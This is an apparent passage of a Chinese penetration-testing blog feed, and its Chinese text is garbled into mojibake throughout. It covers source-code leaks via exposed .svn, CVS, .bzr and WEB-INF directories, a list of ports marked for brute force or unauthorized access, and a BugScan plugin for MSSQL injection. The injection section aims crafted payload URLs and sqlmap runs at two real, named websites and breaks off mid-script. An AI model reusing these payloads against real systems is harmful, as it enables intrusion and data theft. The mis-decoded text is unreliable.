title="SVNå¯¼è‡´æ–‡ä»¶æ³„éœ²"></a>SVNå¯¼è‡´æ–‡ä»¶æ³„éœ²</h4><h5 id="ç®€ä»‹ï¼š"><a href="#ç®€ä»‹ï¼š" class="headerlink" title="ç®€ä»‹ï¼š"></a>ç®€ä»‹ï¼š</h5><p>Subversionï¼Œç®€ç§°SVNï¼Œæ˜¯ä¸€ä¸ªå¼€æ”¾æºä»£ç çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç›¸å¯¹äºçš„RCSã€CVSï¼Œé‡‡ç”¨äº†åˆ†æ”¯ç®¡ç†ç³»ç»Ÿï¼Œå®ƒçš„è®¾è®¡ç›®æ ‡å°±æ˜¯å–ä»£CVSã€‚äº’è”ç½‘ä¸Šè¶Šæ¥è¶Šå¤šçš„æ§åˆ¶æœåŠ¡ä»CVSè½¬ç§»åˆ°Subversionã€‚</p><p>Subversionä½¿ç”¨æœåŠ¡ç«¯â€”å®¢æˆ·ç«¯çš„ç»“æ„ï¼Œå½“ç„¶æœåŠ¡ç«¯ä¸å®¢æˆ·ç«¯å¯ä»¥éƒ½è¿è¡Œåœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šã€‚åœ¨æœåŠ¡ç«¯æ˜¯å­˜æ”¾ç€æ‰€æœ‰å—æ§åˆ¶æ•°æ®çš„Subversionä»“åº“ï¼Œå¦ä¸€ç«¯æ˜¯Subversionçš„å®¢æˆ·ç«¯ç¨‹åºï¼Œç®¡ç†ç€å—æ§æ•°æ®çš„ä¸€éƒ¨åˆ†åœ¨æœ¬åœ°çš„æ˜ å°„ï¼ˆç§°ä¸ºâ€œå·¥ä½œå‰¯æœ¬â€ï¼‰ã€‚åœ¨è¿™ä¸¤ç«¯ä¹‹é—´ï¼Œæ˜¯é€šè¿‡å„ç§ä»“åº“å­˜å–å±‚ï¼ˆRepository Accessï¼Œç®€ç§°RAï¼‰çš„å¤šæ¡é€šé“è¿›è¡Œè®¿é—®çš„ã€‚è¿™äº›é€šé“ä¸­ï¼Œå¯ä»¥é€šè¿‡ä¸åŒçš„ç½‘ç»œåè®®ï¼Œä¾‹å¦‚HTTPã€SSHç­‰ï¼Œæˆ–æœ¬åœ°æ–‡ä»¶çš„æ–¹å¼æ¥å¯¹ä»“åº“è¿›è¡Œæ“ä½œã€‚</p><p>e.g.<a href="http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries" target="_blank" rel="noopener">http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries</a></p><h5 id="æ¼æ´åˆ©ç”¨-1"><a href="#æ¼æ´åˆ©ç”¨-1" class="headerlink" title="æ¼æ´åˆ©ç”¨:"></a>æ¼æ´åˆ©ç”¨:</h5><p>å·¥å…·ï¼š</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http://www.example.com/.svn/</span><br></pre></td></tr></table></figure><p><a href="https://pan.baidu.com/s/1mrNpB" target="_blank" rel="noopener">Seay-Svn</a></p><h4 id="WEB-INF-web-xmlæ³„éœ²"><a href="#WEB-INF-web-xmlæ³„éœ²" class="headerlink" title="WEB-INF/web.xmlæ³„éœ²"></a>WEB-INF/web.xmlæ³„éœ²</h4><h5 id="ç®€ä»‹ï¼š-1"><a href="#ç®€ä»‹ï¼š-1" class="headerlink" title="ç®€ä»‹ï¼š"></a>ç®€ä»‹ï¼š</h5><p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p><p>WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š</p><p>/WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚/WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­/WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶/WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚/WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶</p><h5 id="æ¼æ´æˆå› ï¼š-2"><a href="#æ¼æ´æˆå› ï¼š-2" class="headerlink" title="æ¼æ´æˆå› ï¼š"></a>æ¼æ´æˆå› ï¼š</h5><p>é€šå¸¸ä¸€äº›webåº”ç”¨æˆ‘ä»¬ä¼šä½¿ç”¨å¤šä¸ªwebæœåŠ¡å™¨æ­é…ä½¿ç”¨ï¼Œè§£å†³å…¶ä¸­çš„ä¸€ä¸ªwebæœåŠ¡å™¨çš„æ€§èƒ½ç¼ºé™·ä»¥åŠåšå‡è¡¡è´Ÿè½½çš„ä¼˜ç‚¹å’Œå®Œæˆä¸€äº›åˆ†å±‚ç»“æ„çš„å®‰å…¨ç­–ç•¥ç­‰ã€‚åœ¨ä½¿ç”¨è¿™ç§æ¶æ„çš„æ—¶å€™ï¼Œç”±äºå¯¹é™æ€èµ„æºçš„ç›®å½•æˆ–æ–‡ä»¶çš„æ˜ å°„é…ç½®ä¸å½“ï¼Œå¯èƒ½ä¼šå¼•å‘ä¸€äº›çš„å®‰å…¨é—®é¢˜ï¼Œå¯¼è‡´web.xmlç­‰æ–‡ä»¶èƒ½å¤Ÿè¢«è¯»å–ã€‚</p><h5 id="æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼š"><a href="#æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼š" class="headerlink" title="æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼š"></a>æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼š</h5><p>é€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚</p><p>ä¸€èˆ¬æƒ…å†µï¼Œjspå¼•æ“é»˜è®¤éƒ½æ˜¯ç¦æ­¢è®¿é—®WEB-INFç›®å½•çš„ï¼ŒNginx é…åˆTomcatåšå‡è¡¡è´Ÿè½½æˆ–é›†ç¾¤ç­‰æƒ…å†µæ—¶ï¼Œé—®é¢˜åŸå› å…¶å®å¾ˆç®€å•ï¼ŒNginxä¸ä¼šå»è€ƒè™‘é…ç½®å…¶ä»–ç±»å‹å¼•æ“ï¼ˆNginxä¸æ˜¯jspå¼•æ“ï¼‰å¯¼è‡´çš„å®‰å…¨é—®é¢˜è€Œå¼•å…¥åˆ°è‡ªèº«çš„å®‰å…¨è§„èŒƒä¸­æ¥ï¼ˆè¿™æ ·è€¦åˆæ€§å¤ªé«˜äº†ï¼‰ï¼Œä¿®æ”¹Nginxé…ç½®æ–‡ä»¶ç¦æ­¢è®¿é—®WEB-INFç›®å½•å°±å¥½äº†ï¼š location ~ ^/WEB-INF/* { deny all; } æˆ–è€…return 404; æˆ–è€…å…¶ä»–ï¼</p><h4 id="CVSæ³„æ¼"><a href="#CVSæ³„æ¼" class="headerlink" title="CVSæ³„æ¼"></a>CVSæ³„æ¼</h4><h5 id="æ¼æ´åˆ©ç”¨-2"><a href="#æ¼æ´åˆ©ç”¨-2" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><p>æµ‹è¯•çš„ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://url/CVS/Root è¿”å›æ ¹ä¿¡æ¯</span><br><span class="line"></span><br><span class="line">http://url/CVS/Entries è¿”å›æ‰€æœ‰æ–‡ä»¶çš„ç»“æ„</span><br></pre></td></tr></table></figure><p>å–å›æºç çš„å‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http://url/name dir</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤çš„æ„æ€å°±æ˜¯æŠŠè¿œç«¯ä¸€ä¸ªåä¸ºnameçš„repo cloneåˆ°æœ¬åœ°åä¸ºdirçš„ç›®å½•ä¸‹ã€‚</p><p>æŸ¥çœ‹æ‰€æœ‰çš„æ”¹å˜çš„å‘½ä»¤ï¼Œè½¬åˆ°downloadçš„ç›®å½•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk changes</span><br></pre></td></tr></table></figure><h4 id="Bazaar-bzr"><a href="#Bazaar-bzr" class="headerlink" title="Bazaar/bzr"></a>Bazaar/bzr</h4><h5 id="æ¼æ´åˆ©ç”¨-3"><a href="#æ¼æ´åˆ©ç”¨-3" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><p>å·¥å…·ï¼š</p><p><a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">dvcs-ripper</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http://www.example.com/.bzr/</span><br></pre></td></tr></table></figure><h3 id="ç¥å™¨"><a href="#ç¥å™¨" class="headerlink" title="ç¥å™¨"></a>ç¥å™¨</h3><p><a href="[http://www.bitkeeper.com/installation.instructions](http://www.bitkeeper.com/installation.instructions">Bitkeeper</a>)</p><p><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">weakfilescan</a></p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">http://www.s2.sshz.org/post/source-code-leak/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;èƒŒæ™¯&quot;&gt;&lt;a href=&quot;#èƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;èƒŒæ™¯&quot;&gt;&lt;/a&gt;èƒŒæ™¯&lt;/h3&gt;&lt;p&gt;æœ¬æ–‡ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹å¸¸è§çš„æºç æ³„æ¼é—®é¢˜ï¼Œè¿™äº›ç»å¸¸åœ¨webæ¸—é€æµ‹è¯•ä»¥åŠCTFä¸­å‡ºç°ã€‚&lt;/p&gt;
&lt;h3 id=&quot;æºç æ³„æ¼åˆ†ç±»&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PORT=&gt;æœåŠ¡/æ¼æ´</title>
    <link href="http://zer0yu.github.io/2017/01/24/PORT-%E6%9C%8D%E5%8A%A1-%E6%BC%8F%E6%B4%9E/"/>
    <id>http://zer0yu.github.io/2017/01/24/PORT-æœåŠ¡-æ¼æ´/</id>
    <published>2017-01-24T07:29:05.000Z</published>
    <updated>2017-01-24T07:37:56.000Z</updated>
    
    <content type="html"><![CDATA[<p>èŒƒå›´ï¼š0-65535<br>å›ºå®šç«¯å£ï¼š0-1023 1024ä¿ç•™<br>åŠ¨æ€ç«¯å£ï¼š1024-65535</p><h4 id="å¸¸ç”¨ç«¯å£"><a href="#å¸¸ç”¨ç«¯å£" class="headerlink" title="å¸¸ç”¨ç«¯å£"></a>å¸¸ç”¨ç«¯å£</h4><p>21ï¼šFTP(çˆ†ç ´)</p><p>22ï¼šSSH(çˆ†ç ´)</p><p>23ï¼šTelnet(çˆ†ç ´)</p><p>25ï¼šSMTP</p><p>53ï¼šDNSï¼ˆUDPï¼‰</p><p>69ï¼šTFTPï¼ˆciscoï¼Œç±»ä¼¼FTPï¼‰</p><p>79ï¼šFinger</p><p>80ï¼šHTTP</p><p>110ï¼šPOP3</p><p>111ï¼šRPC è¿œç¨‹è¿‡ç¨‹è°ƒç”¨</p><p>113ï¼šwindows éªŒè¯æœåŠ¡</p><p>119ï¼šNNTP ç½‘ç»œæ–°é—»ç»„ä¼ è¾“åè®®</p><p>135ï¼šRPC è¿œç¨‹è¿‡ç¨‹è°ƒç”¨</p><p>137ï¼šNetBIOS</p><p>139ï¼šwindowsæ–‡ä»¶å’Œæ‰“å°æœºå…±äº«ï¼ŒUnixä¸­çš„sambaæœåŠ¡</p><p>161ï¼šSNMP ç®€å•ç½‘ç»œç®¡ç†åè®®</p><p>389ï¼šLDAP</p><p>443ï¼šHTTPS</p><p>445ï¼šSMB</p><p>1080ï¼šsocksä»£ç†æœåŠ¡</p><p>2082/2083 cpanelä¸»æœºç®¡ç†ç³»ç»Ÿç™»é™† (å›½å¤–ç”¨è¾ƒå¤š)</p><p>2222 DAè™šæ‹Ÿä¸»æœºç®¡ç†ç³»ç»Ÿç™»é™† (å›½å¤–ç”¨è¾ƒå¤š)</p><p>2601,2604ï¼šzebraè·¯ç”±ï¼Œé»˜è®¤å¯†ç zebra</p><p>3128 squidä»£ç†é»˜è®¤ç«¯å£ï¼Œå¦‚æœæ²¡è®¾ç½®å£ä»¤å¾ˆå¯èƒ½å°±ç›´æ¥æ¼«æ¸¸å†…ç½‘äº† </p><p>3312/3311 kangleä¸»æœºç®¡ç†ç³»ç»Ÿç™»é™† </p><p>3389:è¿œç¨‹æ¡Œé¢</p><p>4440 rundeck å‚è€ƒWooYun: å€Ÿç”¨æ–°æµªæŸæœåŠ¡æˆåŠŸæ¼«æ¸¸æ–°æµªå†…ç½‘ </p><p>5900ï¼švnc</p><p>6082 varnish å‚è€ƒWooYun: Varnish HTTP accelerator CLI æœªæˆæƒè®¿é—®æ˜“å¯¼è‡´ç½‘ç«™è¢«ç›´æ¥ç¯¡æ”¹æˆ–è€…ä½œä¸ºä»£ç†è¿›å…¥å†…ç½‘</p><p>7001,7002 WebLogicé»˜è®¤å¼±å£ä»¤ï¼Œååºåˆ—</p><p>8000-9090 éƒ½æ˜¯ä¸€äº›å¸¸è§çš„webç«¯å£ï¼Œæœ‰äº›è¿ç»´å–œæ¬¢æŠŠç®¡ç†åå°å¼€åœ¨è¿™äº›é80çš„ç«¯å£ä¸Š </p><p>8080ï¼šç”¨æˆ·wwwä»£ç†æœåŠ¡,tomcat/WDCPä¸»æœºç®¡ç†ç³»ç»Ÿï¼Œé»˜è®¤å¼±å£ä»¤ </p><p>8080,8089,9090 JBOSS</p><p>8083 Vestacpä¸»æœºç®¡ç†ç³»ç»Ÿ ï¼ˆå›½å¤–ç”¨è¾ƒå¤šï¼‰ </p><p>8649 ganglia </p><p>8888 amh/LuManager ä¸»æœºç®¡ç†ç³»ç»Ÿé»˜è®¤ç«¯å£ </p><p>9200,9300 elasticsearch å‚è€ƒWooYun: å¤šç©æŸæœåŠ¡å™¨ElasticSearchå‘½ä»¤æ‰§è¡Œæ¼æ´ </p><p>10000 Virtualmin/Webmin æœåŠ¡å™¨è™šæ‹Ÿä¸»æœºç®¡ç†ç³»ç»Ÿ </p><p>11211 memcacheæœªæˆæƒè®¿é—® </p><p>27017,27018 Mongodbæœªæˆæƒè®¿é—® </p><p>28017 mongodbç»Ÿè®¡é¡µé¢ </p><p>50000 SAPå‘½ä»¤æ‰§è¡Œ </p><p>50070,50030 hadoopé»˜è®¤ç«¯å£æœªæˆæƒè®¿é—®</p><h4 id="æœ¨é©¬ç—…æ¯’"><a href="#æœ¨é©¬ç—…æ¯’" class="headerlink" title="æœ¨é©¬ç—…æ¯’"></a>æœ¨é©¬ç—…æ¯’</h4><p>5554ï¼šworm.Sasserç—…æ¯’åˆ©ç”¨ç«¯å£<br>7626ï¼šå†°æ²³ç—…æ¯’<br>8011ï¼šWAY2.4ç—…æ¯’<br>7306ï¼šNetspy3.0ç—…æ¯’<br>1024ï¼šYAIç—…æ¯’</p><h4 id="ä¸­é—´ä»¶"><a href="#ä¸­é—´ä»¶" class="headerlink" title="ä¸­é—´ä»¶"></a>ä¸­é—´ä»¶</h4><p>7001,7002ï¼šweblogic<br>9080ï¼šwebshpereåº”ç”¨ç¨‹åº<br>9090ï¼šwebshpereç®¡ç†å·¥å…·<br>8080ï¼štomcaté»˜è®¤ç«¯å£<br>Jbossé€šå¸¸å ç”¨çš„ç«¯å£æ˜¯1098ï¼Œ1099ï¼Œ4444ï¼Œ4445ï¼Œ8080ï¼Œ8009ï¼Œ8083ï¼Œ8093ï¼Œé»˜è®¤ä¸º8080</p><h4 id="æ•°æ®åº“"><a href="#æ•°æ®åº“" class="headerlink" title="æ•°æ®åº“"></a>æ•°æ®åº“</h4><p>3306ï¼šmysql<br>1433ï¼šmssqlserver<br>1434ï¼šsqlserver monitor<br>1521ï¼šoracle:(iSqlPlus Port:5560,7778)<br>5432ï¼šPostgreSQL<br>1158ï¼šORACLE EMCTL<br>8080ï¼šOracle XDB<br>2100ï¼šOracle XDB FTP</p><h4 id="ç‰¹æ®ŠæœåŠ¡ï¼ˆæ¼æ´ï¼‰"><a href="#ç‰¹æ®ŠæœåŠ¡ï¼ˆæ¼æ´ï¼‰" class="headerlink" title="ç‰¹æ®ŠæœåŠ¡ï¼ˆæ¼æ´ï¼‰"></a>ç‰¹æ®ŠæœåŠ¡ï¼ˆæ¼æ´ï¼‰</h4><p>443ï¼šSSLå¿ƒè„æ»´è¡€</p><p>512,513,514ï¼šRsyncæœªæˆæƒè®¿é—®</p><p>873ï¼šRsyncæœªæˆæƒè®¿é—®</p><p>1025,111 NFS </p><p>2375ï¼šdocker remote apiæ¼æ´</p><p>50000ï¼šSAPå‘½ä»¤æ‰§è¡Œ</p><p>5984ï¼šCouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="noopener">http://xxx:5984/_utils/</a></p><p>6379ï¼šredisæœªæˆæƒ</p><p>7001,7002ï¼šWebLogic é»˜è®¤å¼±å£ä»¤ï¼Œååºåˆ—åŒ–</p><p>9200,9300ï¼šelasticsearchæœªæˆæƒè®¿é—®</p><p>11211ï¼šmemcacheæœªæˆæƒè®¿é—®</p><p>27017,27018ï¼šMongodb æœªæˆæƒè®¿é—®<br>28017ï¼šmongodbç»Ÿè®¡é¡µé¢</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;èŒƒå›´ï¼š0-65535&lt;br&gt;å›ºå®šç«¯å£ï¼š0-1023 1024ä¿ç•™&lt;br&gt;åŠ¨æ€ç«¯å£ï¼š1024-65535&lt;/p&gt;
&lt;h4 id=&quot;å¸¸ç”¨ç«¯å£&quot;&gt;&lt;a href=&quot;#å¸¸ç”¨ç«¯å£&quot; class=&quot;headerlink&quot; title=&quot;å¸¸ç”¨ç«¯å£&quot;&gt;&lt;/a&gt;å¸¸ç”¨ç«¯å£&lt;/h4&gt;&lt;p&gt;21ï¼š
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>BugScanæ’ä»¶ç¼–å†™</title>
    <link href="http://zer0yu.github.io/2017/01/22/BugScan%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99/"/>
    <id>http://zer0yu.github.io/2017/01/22/BugScanæ’ä»¶ç¼–å†™/</id>
    <published>2017-01-22T03:23:35.000Z</published>
    <updated>2017-01-22T04:40:59.000Z</updated>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘å››å¶è‰åˆå¼€å§‹æ‹›æ”¶å®ä¹ äº†ï¼Œæ‰€ä»¥æŸä¸ªå¦¹å­å°±æŠ•äº†ç®€å†ã€‚ä¸ä¹…å››å¶è‰å‘æ¥ä¸€ä¸ªé¢˜ç›®è¦å¦¹å­å®Œæˆã€‚Soï¼Ÿè¿™æ„å‘³ç€ä»€ä¹ˆï¼Œè¿™æ„å‘³ç€ä¸€ä¸ªæ³¡å¦¹å­çš„å¥½æ—¶æœºæ¥äº†å•Šã€‚å“ˆå“ˆå“ˆâ€¦â€¦</p><p>ä¸‹é¢å°±è®©æˆ‘ä»¬çœ‹çœ‹è¿™ä¸ªé¢˜ç›®ï¼š</p><p>æŸé€šç”¨å¹³å°è¢«æ›å‡ºæœ‰ä¸€å¤„é«˜å±æ³¨å…¥ï¼Œä»¥ä¸‹ä¸ºè¯¦æƒ…ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1</span><br></pre></td></tr></table></figure><p>userNameå¤„ä¸ºä¸€å¤„æŠ¥é”™æ³¨å…¥ï¼Œ</p><p>è¯·ä½¿ç”¨pythonç¼–å†™ä¸€ä¸ªé€šç”¨è„šæœ¬æ£€æµ‹è¯¥å¤„æ³¨å…¥ç‚¹(å¯ä½¿ç”¨ä»»ä½•pythonåº“)ï¼Œ<br>è¦æ±‚æµ‹è¯•è¯¥è„šæœ¬å¿…é¡»ä½¿ç”¨å¤šä¸ªç›®æ ‡ç«™ç‚¹ã€‚<br>ä»¥ä¸‹ä¸ºä¸¤ä¸ªæµ‹è¯•ç«™ç‚¹ï¼ˆè¯·å‹¿åšé™¤æµ‹è¯•ä¹‹å¤–çš„ä»»ä½•å±é™©åŠ¨ä½œï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://www.jmsyzx.com/</span><br><span class="line">http://www.globechildren.com/</span><br></pre></td></tr></table></figure><p>å“å‘¦ï¼Œä¸é™åˆ¶pythonåº“ï¼Œä¸€ä¸ªé€šç”¨è„šæœ¬ã€‚åˆšè·Ÿå®¤å‹å¼€é»‘äº†ä¸€ä¸‹å®ˆæœ›å…ˆé”‹ï¼ˆæŒºå¥½ç©å„¿çš„ï¼Œæœ‰å…´è¶£ä¸€èµ·å•Šï¼‰çš„æˆ‘åˆšçœ‹ä¹Ÿæ˜¯ä¸€è„¸æ‡µé€¼ï¼Œæ€»ä¹‹åˆšå¼€å§‹æƒ³çš„å¤ªå¤šäº†ï¼Œä½†å…¶å®ä¹Ÿå°±æ˜¯ä¸€ä¸ªæ’ä»¶çš„äº‹æƒ…ï¼ˆè¿˜æ˜¯rangeä¸€æ£’æ‰“é†’æˆ‘ï¼Œæ‰€ä»¥ä»¥åè¿˜æ˜¯å¹²å®Œæ­£äº‹å†å¼€é»‘ï¼‰ã€‚</p><p>çœ‹äº†ä¸€ä¸‹æ˜¯mssqlæ•°æ®åº“ï¼Œå¹¶ä¸”æ˜¯æŠ¥é”™æ³¨å…¥ã€‚æˆ‘ä»¬å¯ä»¥æ‰‹å·¥æ„é€ çœ‹æ•°æ®åº“ç±»å‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=@@version--</span><br></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥sqlmapè·‘ä¸€ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[22:07:32] [INFO] resuming back-end DBMS &apos;microsoft sql server&apos;</span><br><span class="line">[22:07:32] [INFO] testing connection to the target URL</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: userName (GET)</span><br><span class="line">Type: error-based</span><br><span class="line">Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause</span><br><span class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; AND 2390=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2390=2390) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(118)+CHAR(113))) AND &apos;nTAv&apos;=&apos;nTAv</span><br><span class="line">Type: stacked queries</span><br><span class="line">Title: Microsoft SQL Server/Sybase stacked queries (comment)</span><br><span class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos;;WAITFOR DELAY &apos;0:0:5&apos;--</span><br><span class="line">Type: AND/OR time-based blind</span><br><span class="line">Title: Microsoft SQL Server/Sybase time-based blind (comment)</span><br><span class="line">Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; WAITFOR DELAY &apos;0:0:5&apos;--</span><br><span class="line">---</span><br><span class="line">[22:07:33] [INFO] the back-end DBMS is Microsoft SQL Server</span><br><span class="line">web server operating system: Windows 2008 R2 or 7</span><br><span class="line">web application technology: ASP.NET, Microsoft IIS 7.5</span><br><span class="line">back-end DBMS: Microsoft SQL Server 2005</span><br><span class="line">[22:07:33] [INFO] fetched data logged to text files under &apos;C:\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com&apos;</span><br></pre></td></tr></table></figure><p>åˆ«å¤šçœ‹çœ‹é‚£ä¸ªGETå°±è¡Œäº†ï¼ŒGETæœ€ç®€å•äº†ã€‚<br>æˆ‘ä»¬å°±æŠ“ä½æŠ¥é”™è·Ÿæ‰“å°MD5è¿™ä¸¤ç‚¹å°±è¡Œäº†ã€‚</p><p>æ‰“å°MD5å‘¢ï¼Œmssqlæœ‰ä¸¤ç§æ–¹å¼ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))--</span><br><span class="line"></span><br><span class="line">2.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--</span><br></pre></td></tr></table></figure><p>ç›´æ¥ä¸Šæˆ‘å†™çš„è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/evn python</span></span><br><span class="line"><span class="comment">#-*-:coding:utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">POC Name : æ³¡å¦¹ä¸“äº«</span></span><br><span class="line"><span class="string">Author : zeroyu</span></span><br><span class="line"><span class="string">mail : zeroyu.xyz@gmail.com</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="keyword">import</span> hackhttp</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">assign</span><span class="params">(service, 